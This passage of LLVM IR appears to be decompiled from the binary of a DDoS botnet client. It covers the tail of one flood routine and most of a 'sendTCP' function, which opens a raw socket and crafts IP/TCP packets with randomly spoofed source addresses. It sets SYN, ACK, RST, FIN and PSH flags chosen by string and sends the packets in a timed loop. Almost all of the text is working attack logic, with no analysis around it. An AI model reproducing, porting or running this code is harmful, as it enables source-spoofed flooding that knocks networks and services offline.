  %v3_ccac = urem i32 %v0_cca0, 65536
  store i32 %v3_ccac, i32* %r2.global-to-local, align 4
  %v1_ccb4 = trunc i32 %v0_cca0 to i16
  store i16 %v1_ccb4, i16* %v5_cc34, align 4
  br i1 %v2_c8b8, label %dec_label_pc_ccc4, label %dec_label_pc_ccdc

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cbdc
  %v0_ccc4 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_ccc4 to i16
  br label %dec_label_pc_ccf8

dec_label_pc_ccdc:                                ; preds = %dec_label_pc_cbdc
  %v3_cce4 = urem i32 %arg2, 65536
  %v1_ccec = call i32 @__GI_htons(i32 %v3_cce4)
  %extract.t91 = trunc i32 %v1_ccec to i16
  br label %dec_label_pc_ccf8

dec_label_pc_ccf8:                                ; preds = %dec_label_pc_ccc4, %dec_label_pc_ccdc
  %v0_ccc4.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_ccc4 ], [ %extract.t91, %dec_label_pc_ccdc ]
  %v3_cde4.pre-phi = phi i32 [ 0, %dec_label_pc_ccc4 ], [ %v3_cce4, %dec_label_pc_ccdc ]
  %v3_cd00 = add i32 %v3_cc10, 22
  %v4_cd00 = inttoptr i32 %v3_cd00 to i16*
  store i16 %v0_ccc4.sink.off0, i16* %v4_cd00, align 2
  store i32 %v1_cc30, i32* %r2.global-to-local, align 4
  %v3_cd0c = add i32 %v3_cc10, 26
  %v4_cd0c = inttoptr i32 %v3_cd0c to i16*
  store i16 0, i16* %v4_cd0c, align 2
  %v1_cd14 = add i32 %v3_cc10, 28
  %v3_cd1c = load i32, i32* %stack_var_0, align 4
  %v2_cd20 = call i32 @makeRandomStr(i32 %v1_cd14, i32 %v3_cd1c)
  store i32 %v3_cc10, i32* %r2.global-to-local, align 4
  %v1_cd30 = or i32 %v3_cc10, 2
  %v2_cd30 = inttoptr i32 %v1_cd30 to i16*
  %v3_cd30 = load i16, i16* %v2_cd30, align 2
  %v4_cd30 = zext i16 %v3_cd30 to i32
  %v2_cd3c = inttoptr i32 %v3_cc10 to i16*
  %v3_cd3c = call i32 @csum(i16* %v2_cd3c, i32 %v4_cd30)
  %sext4 = mul i32 %v3_cd3c, 65536
  %v1_cd40 = sdiv i32 %sext4, 65536
  store i32 %v1_cd40, i32* %r2.global-to-local, align 4
  %v1_cd4c = trunc i32 %v1_cd40 to i16
  %v3_cd4c = add i32 %v3_cc10, 10
  %v4_cd4c = inttoptr i32 %v3_cd4c to i16*
  store i16 %v1_cd4c, i16* %v4_cd4c, align 2
  %v2_cd54 = call i32 @__GI_time(i32* null)
  %v2_cd60 = add i32 %v2_cd54, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_cd7c = ptrtoint i32* %stack_var_-80 to i32
  %v3_ce18 = or i32 %v3_cc10, 4
  %v4_ce18 = inttoptr i32 %v3_ce18 to i16*
  %v2_ce38 = add i32 %v3_cc10, 12
  %v3_ce38 = inttoptr i32 %v2_ce38 to i32*
  %v3_cec0 = mul i32 %arg8, 4
  %v3_ced0 = mul i32 %arg8, 1000
  br label %dec_label_pc_cd78.outer

dec_label_pc_cd78.outer:                          ; preds = %dec_label_pc_cee8, %dec_label_pc_ceb8, %dec_label_pc_ccf8
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_ccf8 ], [ %v1_cea0, %dec_label_pc_ceb8 ], [ %v1_cea0, %dec_label_pc_cee8 ]
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_ccf8 ], [ 0, %dec_label_pc_ceb8 ], [ %v1_ceec, %dec_label_pc_cee8 ]
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78.outer, %dec_label_pc_ce90
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_ce90 ], [ %stack_var_-112.0.ph, %dec_label_pc_cd78.outer ]
  store i32 %v3_cc10, i32* %r2.global-to-local, align 4
  %v1_cd80 = load i32, i32* @sp, align 4
  %v2_cd80 = inttoptr i32 %v1_cd80 to i32*
  store i32 %v2_cd7c, i32* %v2_cd80, align 4
  %v1_cd88 = load i32, i32* @sp, align 4
  %v2_cd88 = add i32 %v1_cd88, 4
  %v3_cd88 = inttoptr i32 %v2_cd88 to i32*
  store i32 16, i32* %v3_cd88, align 4
  %v0_cd90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cbe0, i32* %r2.global-to-local, align 4
  %v6_cd9c = call i32 @__libc_sendto(i32 %v3_cad8, i32 %v0_cd90, i32 %v1_cbe0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_cda0 = call i32 @rand_cmwc()
  %v3_cdac = urem i32 %v0_cda0, 65536
  store i32 %v3_cdac, i32* %r2.global-to-local, align 4
  %v1_cdb4 = trunc i32 %v0_cda0 to i16
  store i16 %v1_cdb4, i16* %v5_cc34, align 4
  br i1 %v2_c8b8, label %dec_label_pc_cdc4, label %dec_label_pc_cddc

dec_label_pc_cdc4:                                ; preds = %dec_label_pc_cd78
  %v0_cdc4 = call i32 @rand_cmwc()
  %extract.t92 = trunc i32 %v0_cdc4 to i16
  br label %dec_label_pc_cdf8

dec_label_pc_cddc:                                ; preds = %dec_label_pc_cd78
  %v1_cdec = call i32 @__GI_htons(i32 %v3_cde4.pre-phi)
  %extract.t93 = trunc i32 %v1_cdec to i16
  br label %dec_label_pc_cdf8

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_cdc4, %dec_label_pc_cddc
  %v0_cdc4.sink.off0 = phi i16 [ %extract.t92, %dec_label_pc_cdc4 ], [ %extract.t93, %dec_label_pc_cddc ]
  %v4_cdfc = sext i16 %v0_cdc4.sink.off0 to i32
  store i32 %v4_cdfc, i32* %r2.global-to-local, align 4
  store i16 %v0_cdc4.sink.off0, i16* %v4_cd00, align 2
  %v0_ce04 = call i32 @rand_cmwc()
  %v3_ce10 = urem i32 %v0_ce04, 65536
  store i32 %v3_ce10, i32* %r2.global-to-local, align 4
  %v1_ce18 = trunc i32 %v0_ce04 to i16
  store i16 %v1_ce18, i16* %v4_ce18, align 4
  %v1_ce20 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_ce2c = call i32 @__GI_htonl(i32 %v1_ce20)
  store i32 %v1_ce2c, i32* %v3_ce38, align 4
  store i32 %v3_cc10, i32* %r2.global-to-local, align 4
  %v3_ce48 = load i16, i16* %v2_cd30, align 2
  %v4_ce48 = zext i16 %v3_ce48 to i32
  %v3_ce54 = call i32 @csum(i16* %v2_cd3c, i32 %v4_ce48)
  %v1_ce64 = trunc i32 %v3_ce54 to i16
  store i16 %v1_ce64, i16* %v4_cd4c, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_ce70 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_ce70, label %dec_label_pc_ce78, label %dec_label_pc_ce9c

dec_label_pc_ce78:                                ; preds = %dec_label_pc_cdf8
  %v2_ce7c = call i32 @__GI_time(i32* null)
  store i32 %v2_ce7c, i32* %r2.global-to-local, align 4
  %v8_ce8c = icmp sgt i32 %v2_ce7c, %v2_cd60
  br i1 %v8_ce8c, label %dec_label_pc_cef8, label %dec_label_pc_ce90

dec_label_pc_ce90:                                ; preds = %dec_label_pc_ce78
  br label %dec_label_pc_cd78

dec_label_pc_ce9c:                                ; preds = %dec_label_pc_cdf8
  %v1_cea0 = add i32 %stack_var_-112.0, 1
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_ceb0 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_ceb0, label %dec_label_pc_ceb8, label %dec_label_pc_cee8

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_ce9c
  store i32 %v3_cec0, i32* %r2.global-to-local, align 4
  %v1_ced8 = call i32 @usleep(i32 %v3_ced0)
  br label %dec_label_pc_cd78.outer

dec_label_pc_cee8:                                ; preds = %dec_label_pc_ce9c
  %v1_ceec = add i32 %stack_var_-108.0.ph, 1
  store i32 %v1_ceec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cd78.outer

dec_label_pc_cef8:                                ; preds = %dec_label_pc_ce78, %dec_label_pc_cb3c, %dec_label_pc_caf0
  %v1_cf0430 = phi i32 [ %v3_cb4c, %dec_label_pc_cb3c ], [ %v3_cb00, %dec_label_pc_caf0 ], [ %v2_ce7c, %dec_label_pc_ce78 ]
  br label %dec_label_pc_cefc

dec_label_pc_cefc:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_c8f4, %dec_label_pc_c97c, %dec_label_pc_c964, %dec_label_pc_cef8
  %v1_cf04 = phi i32 [ %v3_c904, %dec_label_pc_c8f4 ], [ 0, %dec_label_pc_c97c ], [ %v3_c974, %dec_label_pc_c964 ], [ %v1_cf0430, %dec_label_pc_cef8 ], [ %v2_ca48, %dec_label_pc_ca44 ]
  ret i32 %v1_cf04

; uselistorder directives
  uselistorder i32 %v1_ceec, { 1, 0 }
  uselistorder i32 %v1_cea0, { 1, 0 }
  uselistorder i32 %v0_ce04, { 1, 0 }
  uselistorder i16 %v0_cdc4.sink.off0, { 1, 0 }
  uselistorder i32 %v0_cda0, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v1_cd40, { 1, 0 }
  uselistorder i32 %v3_cce4, { 1, 0 }
  uselistorder i32 %v0_cca0, { 1, 0 }
  uselistorder i32 %v1_cc90, { 1, 0 }
  uselistorder i32 %v3_cc10, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_cbe0, { 1, 0 }
  uselistorder i32 %v1_cab8, { 1, 0 }
  uselistorder i32 %v1_ca6c, { 1, 0 }
  uselistorder i32 %v3_c9ec, { 1, 0 }
  uselistorder i32 %stack_var_-116.0.ph, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 ()* @rand, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 49, { 2, 0, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_cefc, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_cdf8, { 1, 0 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_ccf8, { 1, 0 }
  uselistorder label %dec_label_pc_cbdc, { 1, 0 }
  uselistorder label %dec_label_pc_cb60, { 1, 0 }
  uselistorder label %dec_label_pc_ca44, { 1, 0 }
  uselistorder label %dec_label_pc_c9ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8f4, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 53024, i32* %stack_var_-4, align 4
  %v2_cf1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cf1c, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_cf50 = icmp eq i32 %arg2, 0
  br i1 %v2_cf50, label %dec_label_pc_cf58, label %dec_label_pc_cf70

dec_label_pc_cf58:                                ; preds = %entry
  %v0_cf58 = call i32 @rand_cmwc()
  br label %dec_label_pc_cf8c

dec_label_pc_cf70:                                ; preds = %entry
  %v3_cf78 = urem i32 %arg2, 65536
  %v1_cf80 = call i32 @__GI_htons(i32 %v3_cf78)
  br label %dec_label_pc_cf8c

dec_label_pc_cf8c:                                ; preds = %dec_label_pc_cf58, %dec_label_pc_cf70
  %v3_cf9c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_cfa4 = icmp eq i32 %v3_cf9c, 0
  br i1 %v2_cfa4, label %dec_label_pc_cfb0, label %dec_label_pc_d5ec

dec_label_pc_cfb0:                                ; preds = %dec_label_pc_cf8c
  store i32 8, i32* @r2, align 4
  %v2_cfc4 = bitcast i32* %stack_var_-60 to i8*
  %v3_cfc4 = call i32 @__GI_memset(i8* %v2_cfc4, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_cfd4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_cfe4 = icmp eq i32 %v3_cfd4, 0
  br i1 %v2_cfe4, label %dec_label_pc_cfec, label %dec_label_pc_d004

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfb0
  %v2_cff0 = load i32, i32* @global_var_27918.46, align 4
  %v3_cffc = call i32 @Rootsprintf(i32 %v2_cff0, i32 ptrtoint ([27 x i8]* @global_var_1ceac.469 to i32))
  br label %dec_label_pc_d5ec

dec_label_pc_d004:                                ; preds = %dec_label_pc_cfb0
  store i32 1, i32* %stack_var_-72, align 4
  %v2_d00c = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_d028 = call i32 @__GI_setsockopt(i32 %v3_cfd4, i32 0, i32 3, i32 %v2_d00c, i32 4)
  %v1_d030 = icmp slt i32 %v5_d028, 0
  br i1 %v1_d030, label %dec_label_pc_d038, label %dec_label_pc_d050

dec_label_pc_d038:                                ; preds = %dec_label_pc_d004
  %v2_d03c = load i32, i32* @global_var_27918.46, align 4
  %v3_d048 = call i32 @Rootsprintf(i32 %v2_d03c, i32 ptrtoint ([33 x i8]* @global_var_1cec8.471 to i32))
  br label %dec_label_pc_d5ec

dec_label_pc_d050:                                ; preds = %dec_label_pc_d004
  %v2_d054 = icmp eq i32 %arg4, 0
  br i1 %v2_d054, label %dec_label_pc_d080, label %dec_label_pc_d068

dec_label_pc_d068:                                ; preds = %dec_label_pc_d050
  %v1_d06c = sub i32 32, %arg4
  store i32 %v1_d06c, i32* %r2.global-to-local, align 4
  %v1_d078 = shl i32 -1, %v1_d06c
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d050, %dec_label_pc_d068
  %storemerge9 = phi i32 [ %v1_d078, %dec_label_pc_d068 ], [ 0, %dec_label_pc_d050 ]
  %v1_d084 = add i32 %arg6, 40
  %v1_d094 = add i32 %arg6, 54
  %v3_d098 = and i32 %v1_d094, -8
  %v1_d0a0 = load i32, i32* @sp, align 4
  %v2_d0a0 = sub i32 %v1_d0a0, %v3_d098
  %v1_d0b0 = add i32 %v2_d0a0, 15
  %v3_d0b4 = and i32 %v1_d0b0, -8
  store i32 %v3_d0b4, i32* %r2.global-to-local, align 4
  %v1_d0d4 = add i32 %v3_d0b4, 20
  %v5_d0d8 = inttoptr i32 %v1_d0d4 to i16*
  %v3_d0dc = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d0dc, i32* @r4, align 4
  %v1_d0e4 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_d0f0 = call i32 @__GI_htonl(i32 %v1_d0e4)
  store i32 %v1_d0f0, i32* %r2.global-to-local, align 4
  %v1_d0fc = add i32 %arg6, 20
  %v1_d100 = load i32, i32* @sp, align 4
  %v2_d100 = inttoptr i32 %v1_d100 to i32*
  store i32 %v1_d0fc, i32* %v2_d100, align 4
  %v0_d108 = load i32, i32* @r4, align 4
  %v4_d110 = inttoptr i32 %v3_d0b4 to i8*
  %v5_d110 = call i32 @makeIPPacket(i8* %v4_d110, i32 %v0_d108, i32 %v1_d0f0, i32 6)
  %v0_d114 = call i32 @rand_cmwc()
  %v3_d120 = urem i32 %v0_d114, 65536
  store i32 %v3_d120, i32* %r2.global-to-local, align 4
  %v1_d128 = trunc i32 %v0_d114 to i16
  store i16 %v1_d128, i16* %v5_d0d8, align 4
  %v0_d12c = call i32 @rand_cmwc()
  %v2_d138 = add i32 %v3_d0b4, 24
  %v3_d138 = inttoptr i32 %v2_d138 to i32*
  store i32 %v0_d12c, i32* %v3_d138, align 8
  %v2_d144 = add i32 %v3_d0b4, 28
  %v3_d144 = inttoptr i32 %v2_d144 to i32*
  store i32 0, i32* %v3_d144, align 4
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v1_d14c = add i32 %v3_d0b4, 32
  %v2_d14c = inttoptr i32 %v1_d14c to i8*
  %v3_d14c = load i8, i8* %v2_d14c, align 8
  %v1_d158 = urem i8 %v3_d14c, 16
  %v1_d15c = or i8 %v1_d158, 80
  store i8 %v1_d15c, i8* %v2_d14c, align 8
  %v3_d16c = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ceec.476 to i32), i32* @r1, align 4
  %v3_d178 = inttoptr i32 %v3_d16c to i8*
  %v4_d178 = call i32 @__GI_strcoll(i8* %v3_d178, i32 ptrtoint ([4 x i8]* @global_var_1ceec.476 to i32))
  %v2_d180 = icmp eq i32 %v4_d178, 0
  br i1 %v2_d180, label %dec_label_pc_d188, label %dec_label_pc_d240

dec_label_pc_d188:                                ; preds = %dec_label_pc_d080
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v1_d18c = add i32 %v3_d0b4, 33
  %v2_d18c = inttoptr i32 %v1_d18c to i8*
  %v3_d18c = load i8, i8* %v2_d18c, align 1
  %v1_d19c = or i8 %v3_d18c, 2
  store i8 %v1_d19c, i8* %v2_d18c, align 1
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v3_d1b0 = load i8, i8* %v2_d18c, align 1
  %v1_d1c0 = or i8 %v3_d1b0, 4
  store i8 %v1_d1c0, i8* %v2_d18c, align 1
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v3_d1d4 = load i8, i8* %v2_d18c, align 1
  %v1_d1e4 = or i8 %v3_d1d4, 1
  store i8 %v1_d1e4, i8* %v2_d18c, align 1
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v3_d1f8 = load i8, i8* %v2_d18c, align 1
  %v1_d208 = or i8 %v3_d1f8, 16
  store i8 %v1_d208, i8* %v2_d18c, align 1
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v3_d21c = load i8, i8* %v2_d18c, align 1
  %v1_d22c = or i8 %v3_d21c, 8
  store i8 %v1_d22c, i8* %v2_d18c, align 1
  br label %dec_label_pc_d3e8

dec_label_pc_d240:                                ; preds = %dec_label_pc_d080
  %v3_d240 = load i32, i32* %stack_var_0, align 4
  %v2_d24c = call i32 @__GI_strtok(i32 %v3_d240, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  %v2_d3e018 = icmp eq i32 %v2_d24c, 0
  br i1 %v2_d3e018, label %dec_label_pc_d3e8, label %dec_label_pc_d25c.lr.ph

dec_label_pc_d25c.lr.ph:                          ; preds = %dec_label_pc_d240
  %v1_d27c = add i32 %v3_d0b4, 33
  %v2_d27c = inttoptr i32 %v1_d27c to i8*
  br label %dec_label_pc_d25c

dec_label_pc_d25c:                                ; preds = %dec_label_pc_d25c.lr.ph, %dec_label_pc_d3c8
  %storemerge1319 = phi i32 [ %v2_d24c, %dec_label_pc_d25c.lr.ph ], [ %v2_d3d0, %dec_label_pc_d3c8 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1cef4.480 to i32), i32* @r1, align 4
  %v3_d268 = inttoptr i32 %storemerge1319 to i8*
  %v4_d268 = call i32 @__GI_strcoll(i8* %v3_d268, i32 ptrtoint ([4 x i8]* @global_var_1cef4.480 to i32))
  %v2_d270 = icmp eq i32 %v4_d268, 0
  br i1 %v2_d270, label %dec_label_pc_d278, label %dec_label_pc_d2a0

dec_label_pc_d278:                                ; preds = %dec_label_pc_d25c
  %v3_d27c = load i8, i8* %v2_d27c, align 1
  %v4_d284 = zext i8 %v3_d27c to i32
  %v1_d28c = or i32 %v4_d284, 2
  store i32 %v1_d28c, i32* %r2.global-to-local, align 4
  %v1_d298 = trunc i32 %v1_d28c to i8
  store i8 %v1_d298, i8* %v2_d27c, align 1
  br label %dec_label_pc_d3c8

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d25c
  store i32 ptrtoint ([4 x i8]* @global_var_1cef8.482 to i32), i32* @r1, align 4
  %v4_d2ac = call i32 @__GI_strcoll(i8* %v3_d268, i32 ptrtoint ([4 x i8]* @global_var_1cef8.482 to i32))
  %v2_d2b4 = icmp eq i32 %v4_d2ac, 0
  br i1 %v2_d2b4, label %dec_label_pc_d2bc, label %dec_label_pc_d2e4

dec_label_pc_d2bc:                                ; preds = %dec_label_pc_d2a0
  %v3_d2c0 = load i8, i8* %v2_d27c, align 1
  %v4_d2c8 = zext i8 %v3_d2c0 to i32
  %v1_d2d0 = or i32 %v4_d2c8, 4
  store i32 %v1_d2d0, i32* %r2.global-to-local, align 4
  %v1_d2dc = trunc i32 %v1_d2d0 to i8
  store i8 %v1_d2dc, i8* %v2_d27c, align 1
  br label %dec_label_pc_d3c8

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2a0
  store i32 ptrtoint ([4 x i8]* @global_var_1cefc.484 to i32), i32* @r1, align 4
  %v4_d2f0 = call i32 @__GI_strcoll(i8* %v3_d268, i32 ptrtoint ([4 x i8]* @global_var_1cefc.484 to i32))
  %v2_d2f8 = icmp eq i32 %v4_d2f0, 0
  br i1 %v2_d2f8, label %dec_label_pc_d300, label %dec_label_pc_d328

dec_label_pc_d300:                                ; preds = %dec_label_pc_d2e4
  %v3_d304 = load i8, i8* %v2_d27c, align 1
  %v4_d30c = zext i8 %v3_d304 to i32
  %v1_d314 = or i32 %v4_d30c, 1
  store i32 %v1_d314, i32* %r2.global-to-local, align 4
  %v1_d320 = trunc i32 %v1_d314 to i8
  store i8 %v1_d320, i8* %v2_d27c, align 1
  br label %dec_label_pc_d3c8

dec_label_pc_d328:                                ; preds = %dec_label_pc_d2e4
  store i32 ptrtoint ([4 x i8]* @global_var_1cf00.486 to i32), i32* @r1, align 4
  %v4_d334 = call i32 @__GI_strcoll(i8* %v3_d268, i32 ptrtoint ([4 x i8]* @global_var_1cf00.486 to i32))
  %v2_d33c = icmp eq i32 %v4_d334, 0
  br i1 %v2_d33c, label %dec_label_pc_d344, label %dec_label_pc_d36c

dec_label_pc_d344:                                ; preds = %dec_label_pc_d328
  %v3_d348 = load i8, i8* %v2_d27c, align 1
  %v4_d350 = zext i8 %v3_d348 to i32
  %v1_d358 = or i32 %v4_d350, 16
  store i32 %v1_d358, i32* %r2.global-to-local, align 4
  %v1_d364 = trunc i32 %v1_d358 to i8
  store i8 %v1_d364, i8* %v2_d27c, align 1
  br label %dec_label_pc_d3c8

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d328
  store i32 ptrtoint ([4 x i8]* @global_var_1cf04.488 to i32), i32* @r1, align 4
  %v4_d378 = call i32 @__GI_strcoll(i8* %v3_d268, i32 ptrtoint ([4 x i8]* @global_var_1cf04.488 to i32))
  %v2_d380 = icmp eq i32 %v4_d378, 0
  br i1 %v2_d380, label %dec_label_pc_d388, label %dec_label_pc_d3b0

dec_label_pc_d388:                                ; preds = %dec_label_pc_d36c
  %v3_d38c = load i8, i8* %v2_d27c, align 1
  %v4_d394 = zext i8 %v3_d38c to i32
  %v1_d39c = or i32 %v4_d394, 8
  store i32 %v1_d39c, i32* %r2.global-to-local, align 4
  %v1_d3a8 = trunc i32 %v1_d39c to i8
  store i8 %v1_d3a8, i8* %v2_d27c, align 1
  br label %dec_label_pc_d3c8

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d36c
  %v2_d3b4 = load i32, i32* @global_var_27918.46, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_d3c4 = call i32 @Rootsprintf(i32 %v2_d3b4, i32 ptrtoint ([18 x i8]* @global_var_1cf08.490 to i32))
  br label %dec_label_pc_d3c8

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d388, %dec_label_pc_d344, %dec_label_pc_d300, %dec_label_pc_d2bc, %dec_label_pc_d278, %dec_label_pc_d3b0
  %v2_d3d0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cef0.478 to i32))
  %v2_d3e0 = icmp eq i32 %v2_d3d0, 0
  br i1 %v2_d3e0, label %dec_label_pc_d3e8, label %dec_label_pc_d25c

dec_label_pc_d3e8:                                ; preds = %dec_label_pc_d3c8, %dec_label_pc_d240, %dec_label_pc_d188
  %v0_d3e8 = call i32 @rand_cmwc()
  %v1_d3fc = trunc i32 %v0_d3e8 to i16
  %v3_d3fc = add i32 %v3_d0b4, 34
  %v4_d3fc = inttoptr i32 %v3_d3fc to i16*
  store i16 %v1_d3fc, i16* %v4_d3fc, align 2
  %v3_d408 = add i32 %v3_d0b4, 36
  %v4_d408 = inttoptr i32 %v3_d408 to i16*
  store i16 0, i16* %v4_d408, align 4
  store i32 %v1_d0d4, i32* %r2.global-to-local, align 4
  %v3_d414 = add i32 %v3_d0b4, 38
  %v4_d414 = inttoptr i32 %v3_d414 to i16*
  store i16 0, i16* %v4_d414, align 2
  br i1 %v2_cf50, label %dec_label_pc_d424, label %dec_label_pc_d43c

dec_label_pc_d424:                                ; preds = %dec_label_pc_d3e8
  %v0_d424 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_d424 to i16
  br label %dec_label_pc_d458

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d3e8
  %v3_d444 = urem i32 %arg2, 65536
  %v1_d44c = call i32 @__GI_htons(i32 %v3_d444)
  %extract.t72 = trunc i32 %v1_d44c to i16
  br label %dec_label_pc_d458

dec_label_pc_d458:                                ; preds = %dec_label_pc_d424, %dec_label_pc_d43c
  %v0_d424.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_d424 ], [ %extract.t72, %dec_label_pc_d43c ]
  %v3_d460 = add i32 %v3_d0b4, 22
  %v4_d460 = inttoptr i32 %v3_d460 to i16*
  store i16 %v0_d424.sink.off0, i16* %v4_d460, align 2
  %v2_d46c = call i32 @tcpcsum(i32 %v3_d0b4, i32 %v1_d0d4)
  %v1_d47c = trunc i32 %v2_d46c to i16
  store i16 %v1_d47c, i16* %v4_d408, align 4
  store i32 %v3_d0b4, i32* %r2.global-to-local, align 4
  %v1_d48c = or i32 %v3_d0b4, 2
  %v2_d48c = inttoptr i32 %v1_d48c to i16*
  %v3_d48c = load i16, i16* %v2_d48c, align 2
  %v4_d48c = zext i16 %v3_d48c to i32
  %v2_d498 = inttoptr i32 %v3_d0b4 to i16*
  %v3_d498 = call i32 @csum(i16* %v2_d498, i32 %v4_d48c)
  %sext3 = mul i32 %v3_d498, 65536
  %v1_d49c = sdiv i32 %sext3, 65536
  store i32 %v1_d49c, i32* %r2.global-to-local, align 4
  %v1_d4a8 = trunc i32 %v1_d49c to i16
  %v3_d4a8 = add i32 %v3_d0b4, 10
  %v4_d4a8 = inttoptr i32 %v3_d4a8 to i16*
  store i16 %v1_d4a8, i16* %v4_d4a8, align 2
  %v2_d4b0 = call i32 @__GI_time(i32* null)
  %v2_d4bc = add i32 %v2_d4b0, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d4d0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_d510 = add i32 %v3_d0b4, 12
  %v3_d510 = inttoptr i32 %v2_d510 to i32*
  %v3_d528 = or i32 %v3_d0b4, 4
  %v4_d528 = inttoptr i32 %v3_d528 to i16*
  br label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d5dc, %dec_label_pc_d5d0, %dec_label_pc_d458
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_d458 ], [ 0, %dec_label_pc_d5d0 ], [ %v1_d5e0, %dec_label_pc_d5dc ]
  store i32 %v3_d0b4, i32* %r2.global-to-local, align 4
  %v1_d4d4 = load i32, i32* @sp, align 4
  %v2_d4d4 = inttoptr i32 %v1_d4d4 to i32*
  store i32 %v2_d4d0, i32* %v2_d4d4, align 4
  %v1_d4dc = load i32, i32* @sp, align 4
  %v2_d4dc = add i32 %v1_d4dc, 4
  %v3_d4dc = inttoptr i32 %v2_d4dc to i32*
  store i32 16, i32* %v3_d4dc, align 4
  %v0_d4e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d084, i32* %r2.global-to-local, align 4
  %v6_d4f0 = call i32 @__libc_sendto(i32 %v3_cfd4, i32 %v0_d4e4, i32 %v1_d084, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d4f8 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_d504 = call i32 @__GI_htonl(i32 %v1_d4f8)
  store i32 %v1_d504, i32* %r2.global-to-local, align 4
  store i32 %v1_d504, i32* %v3_d510, align 4
  %v0_d514 = call i32 @rand_cmwc()
  %v3_d520 = urem i32 %v0_d514, 65536
  store i32 %v3_d520, i32* %r2.global-to-local, align 4
